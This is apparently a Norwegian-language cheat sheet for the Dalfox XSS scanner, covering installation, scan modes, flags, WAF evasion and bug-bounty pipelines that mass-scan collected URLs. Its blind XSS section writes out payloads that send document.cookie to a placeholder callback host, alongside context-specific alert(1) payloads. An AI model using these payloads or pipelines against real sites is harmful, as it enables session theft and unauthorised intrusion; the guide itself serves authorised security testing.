# 🦊 Dalfox – rammeverk for XSS-skanning

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

> **Versjonsmerknad:** Denne siden bevarer eldre Dalfox-syntaks med url/file/pipe og Go-installasjon. Hovedversjoner kan endre implementasjon, underkommandoer, API-stier og flagg; se [Dalfox-prosjektets veiledning](https://github.com/hahwul/dalfox). Ikke anta at `-p` betyr en bokstavelig egendefinert payload eller at alle viste eksempler er gyldige for din versjon. WAF-gjenkjenning garanterer ikke omgåelse, og reflektert tekst eller en OOB-forespørsel er ikke alene bevis på kjørbar XSS. HTML-/JS-/attributtkontekst må vurderes separat. Koden er bevart.

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Kraftig verktøy for XSS-skanning og analyse
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Dalfox](#-hva-er-dalfox)
- [Installasjon](#-installasjon)
- [Grunnleggende bruk](#-grunnleggende-bruk)
- [Skannemoduser](#-skannemoduser)
- [Avanserte alternativer](#-avanserte-alternativer)
- [Blind XSS](#-blind-xss)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🎯 Hva er Dalfox

**Dalfox** er et kraftig verktøy for skanning og analyse av XSS-sårbarheter:

- 🔍 **Parameteranalyse** – finn refleksjonspunkter
- 🎯 **XSS-gjenkjenning** – reflektert og DOM-basert
- 💉 **Blind XSS** – testing utenfor den direkte responskanalen
- ⚡ **Raskt** – Go-basert, med høy parallellitet

### Hvorfor Dalfox?

| Egenskap | Fordel |
|---------|---------|
| Intelligent analyse | Payloads tilpasset konteksten |
| WAF-gjenkjenning | Omgåelse av vanlige WAF-er |
| Blind XSS | Støtte for OOB-samhandling |
| Mining-modus | Finn parametere fra JavaScript |

---

## 🚀 Installasjon

```bash
# Installasjon med Go (anbefalt)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Kontroller
dalfox version
```

---

## 📖 Grunnleggende bruk

### Én URL

```bash
# Grunnleggende skanning
dalfox url https://example.com/search?q=test

# Lagre utdata
dalfox url https://example.com/search?q=test -o results.txt
```

### Flere URL-er

```bash
# Fra standard inndata
cat urls.txt | dalfox pipe

# Fra fil
dalfox file urls.txt

# Med parallellitet
cat urls.txt | dalfox pipe -w 50
```

### Stille modus

```bash
# Vis bare sårbarheter
dalfox url https://example.com/search?q=test --silence

# Uten farger
dalfox url https://example.com/search?q=test --no-color
```

---

## 🔎 Skannemoduser

### URL-modus

```bash
# Skann én URL
dalfox url https://example.com/page?param=value

# Skann med data
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Pipe-modus

```bash
# Fra standard inndata
echo "https://example.com/search?q=test" | dalfox pipe

# Flere URL-er
cat urls_with_params.txt | dalfox pipe
```

### Filmodus

```bash
# Fra fil
dalfox file urls.txt

# Med utdata
dalfox file urls.txt -o results.txt
```

### Servermodus

```bash
# Start API-server
dalfox server

# Egendefinert port
dalfox server -p 8080

# Send deretter forespørsler:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-avanserte-alternativer"></a>
## ⚙️ Avanserte alternativer

### Egendefinerte headere

```bash
# Legg til header
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Flere headere
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Informasjonskapsler og autentisering

```bash
# Med informasjonskapsel
dalfox url https://example.com/search?q=test -C "session=abc123"

# Grunnleggende autentisering
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Egendefinerte payloads

```bash
# Bruk en egendefinert payloadfil
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Én egendefinert payload
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Payloadformat i filen:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Utdataformater

```bash
# JSON-utdata
dalfox url https://example.com/search?q=test --format json -o result.json

# Bare sårbarheter
dalfox url https://example.com/search?q=test --only-poc
```

### Ytelse

```bash
# Angi arbeidere (parallellitet)
dalfox url https://example.com/search?q=test -w 100

# Tidsavbrudd (sekunder)
dalfox url https://example.com/search?q=test --timeout 10

# Forsinkelse mellom forespørsler (ms)
dalfox url https://example.com/search?q=test --delay 100
```

### Omgåelse av WAF

```bash
# Bruk WAF-omgåelse
dalfox url https://example.com/search?q=test --waf-evasion

# Ignorer fingeravtrykk
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# HTTP-proxy
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# For Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

## 💉 Blind XSS

### Bruke payload for blind XSS

```bash
# Med XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# Flagget -b legger til tilbakemeldinger for blind XSS
```

### Blind XSS med egendefinert payload

```bash
# Egendefinert blind payload
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Eksempler på blinde payloads

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

## 📊 Hurtigreferanse

### Grunnleggende kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `dalfox url URL` | Skann én URL |
| `dalfox file file.txt` | Skann fra fil |
| `cat urls \| dalfox pipe` | Skann fra standard inndata |
| `dalfox server` | Start API-server |

### Viktige flagg

| Flagg | Beskrivelse |
|------|-------------|
| `-o file.txt` | Utdatafil |
| `-w 50` | Arbeidere (parallellitet) |
| `-H "Header: value"` | Egendefinert header |
| `-C "cookie=value"` | Informasjonskapsel |
| `-b "url"` | Tilbakemelding for blind XSS |
| `--proxy URL` | HTTP-proxy |
| `--timeout 10` | Tidsavbrudd for forespørsel |

### Utdataalternativer

| Flagg | Beskrivelse |
|------|-------------|
| `--format json` | JSON-utdata |
| `--only-poc` | Vis bare PoC |
| `--silence` | Stille modus |
| `--no-color` | Utdata uten farger |

### Payloadalternativer

| Flagg | Beskrivelse |
|------|-------------|
| `-p "payload"` | Egendefinert payload |
| `--custom-payload file` | Payloadfil |
| `--waf-evasion` | Modus for WAF-omgåelse |

---

## 🎯 Arbeidsflyter for bug bounty

### Grunnleggende XSS-skanning

```bash
# Rask skanning
dalfox url "https://target.com/search?q=test" --silence
```

### Fra innsamlede URL-er

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Skanning av mange mål

```bash
# Skann alle parametere fra URL-ene
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Med GF-mønstre

```bash
# Med GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Med httpx-filter
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Autentisert skanning

```bash
# Med økt
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Omfattende pipeline

```bash
# Full pipeline for XSS-jakt
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Kampanje for blind XSS

```bash
# Blind XSS mot mange mål
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Spesielt for inndataskjemaer
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

## 💡 Tips for XSS-jakt

1. **Undersøk alle parametere** – ikke bare de åpenbare
2. **Test ulike kontekster** – HTML, JavaScript og attributter
3. **Bruk blind XSS** – mot administratorpaneler og logger
4. **Kombiner med åpen omdirigering** – for større konsekvenser
5. **Undersøk responsheadere** – CSP, X-XSS-Protection
6. **Test POST-parametere** – de blir ofte oversett

### Vanlige injeksjonspunkter for XSS

```
- Søkefelt
- Brukerprofilfelt
- Kommentarer/tilbakemeldinger
- URL-parametere
- HTTP-headere (Referer, User-Agent)
- Filnavn ved opplasting
- Feilmeldinger
```

### Kontekstspesifikke payloads

| Kontekst | Payload |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Attributt | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

## 📚 Ressurser

- [Dalfox GitHub](https://github.com/hahwul/dalfox)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)

### Relaterte hurtigreferanser
- [Bug Bounty Methodology](../../Bug-Bounty-Methodology/translations/README.nb.md)
- [XSS Payloads](../../Payloads/translations/XSS.nb.md)
- [Burp Suite](../../Burp-Suite/translations/README.nb.md)

---

<p align="center">
  <b>🦊 Finn XSS-sårbarheter!</b><br>
  <i>Dalfox – en følgesvenn for XSS-jegeren</i>
</p>
